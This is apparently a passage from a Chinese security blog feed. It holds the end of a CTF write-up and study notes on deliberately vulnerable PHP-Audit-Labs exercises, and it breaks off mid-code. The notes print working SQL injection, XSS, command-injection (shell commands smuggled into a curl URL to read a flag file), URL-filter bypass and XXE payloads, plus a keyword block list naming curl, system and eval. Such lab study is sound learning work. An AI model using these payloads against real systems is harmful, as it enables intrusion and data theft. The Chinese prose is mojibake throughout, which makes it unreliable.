ä¸ºdockerç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå†…ç½‘æœåŠ¡æ²¡èµ·æ¥,æ‰€ä»¥æ²¡æ³•ç»§ç»­å¤ç°äº†ã€‚åé¢å¤§è‡´çš„å†…å®¹å°±æ˜¯å‘ç°adminçš„é¡µé¢æœ‰ç…§ç‰‡,æ‰€ä»¥å¯ä»¥ä¸€ä¸ªä¸ªä¸‹ä¸‹æ¥æ‹¼å›¾å³å¯ã€‚(ç”¨åˆ°äº†ä¹‹å‰çš„pngbypassCSPçš„å†…å®¹)</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯å‡ ä¹å…¨ç¨‹è‡ªé—­ã€‚è™½ç„¶å¤§å®¶åº”è¯¥éƒ½å·®ä¸å¤šå§ã€‚è€Œä¸”æ²¡æƒ³åˆ°çš„æ˜¯è‡ªå·±å±…ç„¶æ˜¯WEBä¸»C,ä¼°è®¡ä»¥åä¹Ÿä¼šè¿™æ ·æ‰¿æ‹…èµ·æ¯”ä»¥å¾€æ›´å¤§çš„è´£ä»»äº†.å­¦é•¿ä»¬æ²¡æ‰“ï¼Œå°±åªèƒ½é è‡ªå·±ã€‚å¯èƒ½ä¸€ç›´ä»¥æ¥å¿ƒé‡Œè§‰å¾—æœ‰éƒç¦»æ­Œåœ¨,è¿™äº›é¢˜ç›®éƒ½ä¸æ˜¯äº‹çš„.ç„¶è€Œè¿™æ¬¡De1ç›´æ¥æ³¼äº†ä¸€å¤´å†·æ°´ï¼Œæé†’æˆ‘æœ€åè¿˜æ˜¯å¾—é è‡ªå·±ã€‚ç¡¬å®åŠ›æ‰æ˜¯ç‹é“ã€‚</p><p>é©¬ä¸Šç½‘é¼ä¹Ÿæ¥äº†ï¼Œè¿™æ®µæ—¶é—´äº‰å–æŠŠjavaå®‰å…¨èƒ½å…¥ä¸ªé—¨ï¼Œphpä»£å®¡è¿‡å®Œå§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Audit-Labså®¡è®¡å­¦ä¹ </title>
      <link href="2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ‰“ç®—åœ¨ä»£ç å®¡è®¡ä¸Šå…¥ä¸‹å‘ã€‚æœ¬æ¥æ‰¾äº†ä¸ªä¸çŸ¥åcmsæƒ³å®¡è®¡ä¸€ä¸‹çš„ã€‚å¶ç„¶é—´çœ‹åˆ°äº†æ˜Ÿç›Ÿç‹å¹ä¹‹å¸ˆå‚…åœ¨ç”¨php-audit-labsç»ƒå®¡è®¡,æ‰€ä»¥è‡ªå·±ä¹Ÿæ‰“ç®—ç»ƒä¸€ä¸‹å®¡è®¡çš„æŠ€æœ¯,æ¯•ç«Ÿè‡ªå·±å®¡è®¡åŠŸåŠ›å¤ªå·®äº†â€¦pç‰›ä¹Ÿæ›¾ç»è¯´è¿‡,ç»ƒä¹ å®¡è®¡åˆ°èƒ½çœ‹æ‡‚ä¸€ä¸ªå®Œæ•´çš„CMSå°±ç®—æœ‰ä¸€å®šåŠŸåº•äº†ã€‚æ‰€ä»¥å°±æŠŠphp-audit-labsçš„å…¨éƒ¨éƒ½è¿‡ä¸€éå§ã€‚</p><p>(æœ€è¿‘ä¹Ÿæ€»ç®—ç†Ÿç»ƒäº†ä¸€ä¸‹nodeè·Ÿpythonç›¸å…³çš„å¼€å‘å…¥é—¨ã€‚ç­‰ä¹‹åæ‰¾æ—¶é—´æŠŠjavaå…¥é—¨çŸ¥è¯†è¿‡ä¸€é,å†æŠŠECMAscript6çš„åŸºç¡€è¿‡ä¸€éå°±å·®ä¸å¤šäº†ï¼‰</p><a id="more"></a><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ä¸»è¦é—®é¢˜åœ¨äº<code>in_array()</code>å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¦‚æœæœªè®¾ç½®<code>in_array()</code>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ <code>7shell.php</code>ç»•è¿‡æ£€æŸ¥ã€‚å› ä¸º<code>7shell.php</code>è¢«è½¬æ¢ä¸º7.<br>åŒæ ·å‡ºç°åœ¨æŸcmsä¸­åˆ©ç”¨è¿™ç‚¹å¯ä»¥ç»•è¿‡è¿›è¡Œinsert_intoæ³¨å…¥<br><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/2.png" class="lazyload" data-srcset="2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å½“in_array()ç»•è¿‡åè½»æ¾è¾¾æˆæ³¨å…¥ã€‚<br><code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code></p><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">    $back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">    <span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"è¿æ¥å¤±è´¥: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">'COUNT(*)'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE id=$id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"id $id is not in whitelist."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜çš„<code>in_array()</code>å¹¶ä¸æ˜¯éš¾ç‚¹ã€‚å› ä¸ºåªè¦idå¼€å¤´ä¸ºæ•°å­—å°±èƒ½ç»•è¿‡äº†<br>ä¸»è¦é—®é¢˜åœ¨äºåé¢æ³¨å…¥ä¸Šã€‚<br>æ‰€å¹¸è¯­å¥ä¸­ä¼šçˆ†å‡ºsqlerror.åœ¨è¿‡æ»¤äº†è¿™äº›å…³é”®å­—çš„æƒ…å†µä¸‹ä»å¯ä»¥ä½¿ç”¨æŠ¥é”™å‡½æ•°,select,fromç­‰åŸºæœ¬å°±è¶³å¤Ÿå¾—åˆ°flagäº†ã€‚<br>ä¸è¿‡è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç»†èŠ‚,å°±æ˜¯updatexmlè¿™æ ·çš„æŠ¥é”™å‡½æ•°å¦‚æœè¯­å¥ä¸­ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ä¹Ÿå°±æ˜¯æˆ‘ä»¬åŸæ¥ç»å¸¸ä½¿ç”¨çš„0x7eä¹‹ç±»çš„å­—ç¬¦ï¼Œçˆ†å‡ºçš„ç»“æœå°†ä¼šå‡ºç°å­—ç¬¦ä¸¢å¤±çš„ç°è±¡ã€‚</p><p>æ‰€ä»¥æ‰¾æ›¿ä»£çš„å­—ç¬¦ä¸²è¿æ¥å‡½æ•°å³å¯.<code>make_set()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure><p>å…¶å®è‡ªå·±åŸæ¥åšsqlæ³¨å…¥çš„é¢˜ç›®ä¹Ÿæ›¾æœç´¢è¿‡ç›¸å…³çš„å†…å®¹ã€‚æ¯”å¦‚åœ¨concatè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ä¸ä½¿ç”¨<code>group_concat</code>å°†æ‰€æœ‰æŸ¥è¯¢ç»“æœéƒ½åˆ—å‡ºæ¥ã€‚å½“æ—¶å‘ç°<code>make_set()</code>æ˜¯èƒ½èµ·åˆ°concatä¸€æ ·çš„æ•ˆæœçš„ã€‚ä½†æ˜¯æ³¨æ„çš„æ˜¯,<code>make_set</code>è‡³å°‘æ¥æ”¶ä¸¤ä¸ªå‚æ•°,å› æ­¤å¿…é¡»ä½¿ç”¨é€—å·ã€‚<code>concat</code>ç±»åˆ™ä¸ç„¶ã€‚</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/3.png" class="lazyload" data-srcset="3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¢˜ç›®ä¸»è¦æ˜¯åœ¨ä¸¤å¤„å­˜åœ¨è¿‡æ»¤ã€‚é¦–å…ˆæ˜¯twigæ¨¡æ¿é‡Œå‡ºç°çš„linkè¢«escapeäº†</p><p>ç„¶åæ˜¯ä¸€ä¸ªfilter_var()å‡½æ•°<br>è¿™é‡Œescapeè¿‡æ»¤å™¨è°ƒç”¨çš„å®é™…ä¸Šæ˜¯<code>htmlspecialchars()</code>å‡½æ•°ã€‚ä½œç”¨è‡ªç„¶æ˜¯å°†å¸¸è§çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¸ºå®ä½“å­—ç¬¦ã€‚<br>è€Œ<code>filter_var()</code>åœ¨curlçš„ssrfä¸­å°±æ›¾è§è¿‡ã€‚ä¸»è¦æ£€æŸ¥ä¸€ä¸ªurlæ˜¯å¦åˆæ³•ã€‚<br>å› æ­¤ä»£ç é€»è¾‘ä¸»è¦æ˜¯ç»è¿‡è¿‡æ»¤åç”Ÿæˆä¸€ä¸ªaæ ‡ç­¾ã€‚<br>é‚£ä¹ˆå¯èƒ½å­˜åœ¨self-xss</p><p>å®˜æ–¹çš„payload<br><code>?nextSlide=javascript://commentï¼…250aalert(1)</code>è¾¾åˆ°å¼¹çª—çš„self-xss. ä½¿ç”¨javascriptä¼ªåè®®ç»•è¿‡<br>å·§å¦™çš„å°±æ˜¯åˆ©ç”¨filtervarçš„ç¼ºé™·è½»æ¾ä½¿ç”¨xxx://çš„å½¢å¼ç»•è¿‡æ£€æŸ¥ã€‚ç„¶åä¹Ÿå¯ä»¥è¿›è¡Œjsè¯­å¥çš„æ‰§è¡Œã€‚é‡è¦çš„ä¸€ç‚¹å°±æ˜¯//åœ¨jsä¸­æ˜¯æ³¨é‡Šç¬¦ã€‚å› æ­¤ä½¿ç”¨%250a(double urlencode %0a ä»¥ç»•è¿‡æµè§ˆå™¨è‡ªåŠ¨çš„è§£ç )å°†åé¢çš„å†…å®¹æ¢è¡Œåˆ°ä¸‹ä¸€è¡Œã€‚æˆåŠŸæ‰§è¡Œalert.</p><p>æŸcmsä¸­çš„åˆ©ç”¨æ˜¯,åœ¨è®¿é—®404é¡µé¢å­˜åœ¨è¿™æ ·çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span>&lt;/code&gt;</span><br></pre></td></tr></table></figure><p>current_url()æ–¹æ³•æ¥å—å®Œæ•´çš„404urlå‚æ•°ã€‚è¿”å›æœ€åä¸€ä¸ª/åçš„å†…å®¹æ‹¼æ¥è¿›codeä»£ç å—ã€‚å³å¯ä»¥æ’å…¥xssä»£ç <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>å¯¼è‡´äº†xss<br>payload<code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ˜æ˜¾çš„curlã€‚è€Œä¸”è¿˜æ˜¯ç»å…¸çš„å¯ç»•è¿‡çš„<code>filter_var()</code>+<code>parse_url()</code>+<code>exec()</code>æ‰§è¡Œcurlçš„é…ç½®ã€‚<br>é‚£ç°åœ¨å…³é”®æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚<br>æ¯”å¦‚æŠŠä¹‹å‰çš„å¯ç»•è¿‡<code>filter_var()</code>+<code>parse_url()</code>çš„payloadæ‹¿å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">demo:&#x2F;&#x2F;evil.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">demo:&#x2F;&#x2F;evil.com:80,sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤è¯»å–æ–‡ä»¶ã€‚é‚£ä¹ˆæ°å¥½å¯ä»¥ç”¨åˆ°linuxä¸­ä½¿ç”¨åˆ†å·è¿›è¡Œå‘½ä»¤åˆ†å‰²çš„ä½œç”¨ã€‚<br><code>demo://%22;ls;%23;sec-redclub.com:80/</code><br>ç„¶åä¸ºäº†è¯»æ–‡ä»¶ä½¿ç”¨<code>&lt;</code>ä»£æ›¿ç©ºæ ¼<br><code>demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code></p><p>å•çº¯é’ˆå¯¹filter_varçš„è¯æŠŠä¸ƒæœˆç«å¸ˆå‚…çš„payloadæ”¾å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23</span><br></pre></td></tr></table></figure><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="class-exists-amp-amp-å†…éƒ¨ç±»xxe"><a href="#class-exists-amp-amp-å†…éƒ¨ç±»xxe" class="headerlink" title="class_exists()&amp;&amp;å†…éƒ¨ç±»xxe"></a>class_exists()&amp;&amp;å†…éƒ¨ç±»xxe</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/4.png" class="lazyload" data-srcset="4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸Šé¢çš„ä»£ç æœ‰ä¸€ä¸ªæ¯”è¾ƒè¿‡æ—¶çš„è·¯å¾„ç©¿è¶Šçš„æ–‡ä»¶åŒ…å«çš„æ´ã€‚<br>å³è°ƒç”¨<code>class_exists()</code>å‡½æ•°æ—¶ä¼šè‡ªåŠ¨åŠ è½½__autoload()ã€‚è¾¾æˆæ–‡ä»¶åŒ…å«ã€‚å¦‚æœæ˜¯ph5-5.3åˆ™å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šã€‚<br>è¿˜æœ‰ä¸€ä¸ªæ´æ¯”è¾ƒæœ‰æ„æ€ã€‚å®ä¾‹åŒ–ç±»çš„ç±»åå’Œä¼ å…¥ç±»çš„å‚æ•°å‡å¯æ§ã€‚æ­¤æ—¶å³ä½¿æ²¡æœ‰æ¶æ„ç±»æˆ‘ä»¬ä¹Ÿèƒ½ç”¨SimpleXMLElementæ„é€ xxeæ”»å‡»ã€‚è¿™ç‚¹æˆ‘åœ¨buuä¸Šåš<br>SUCTF 2018 Homeworkè¿™é¢˜æ—¶ä¹Ÿç”¨åˆ°äº†å®ƒè¾¾æˆxxeå¹¶è¿›ä¸€æ­¥ä½¿ç”¨xxeæ‰“ssrf</p><p>æŸcmsçš„åˆ©ç”¨æ˜¯ä¸€ä¸ªå¯æ§å˜é‡å¸¦æ¥çš„ååºåˆ—åŒ–XXE.å…·ä½“åˆ©ç”¨ä¸è°ˆã€‚ç®€å•è¯´ä¸‹gadgetæœ€åçš„åˆ©ç”¨ã€‚ç±»ä¸­å®ç°äº†ä¸€ä¸ªåå°„ç±»å®ä¾‹åŒ–ã€‚è€Œç±»åå¯æ§ã€‚ä¹‹åè¿åå°„ç±»çš„å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ã€‚å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„å®ä¾‹åŒ–SimpleXMLElementå¹¶æ„é€ xxepayloadè¿›è¡Œæ”»å‡»ã€‚<br>æ ¹æ®å®é™…æƒ…å†µæ„é€ payload<br><code>{&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}</code><br>è¿™é‡Œå‡ ä¸ªå‚æ•°å°¤å…¶æ˜¯2é‚£ä¸ªå°è±¡å¾ˆæ·±åˆ»,åŒæ—¶ä¹Ÿå¾ˆå¿…è¦ã€‚SUCTFé‚£é¢˜å°±æ˜¯å¦‚æ­¤<br><code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code></p><h3 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]) ? $_GET[<span class="string">'param'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]) ? $_GET[<span class="string">'param2'</span>] : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">    $newclass = <span class="keyword">new</span> 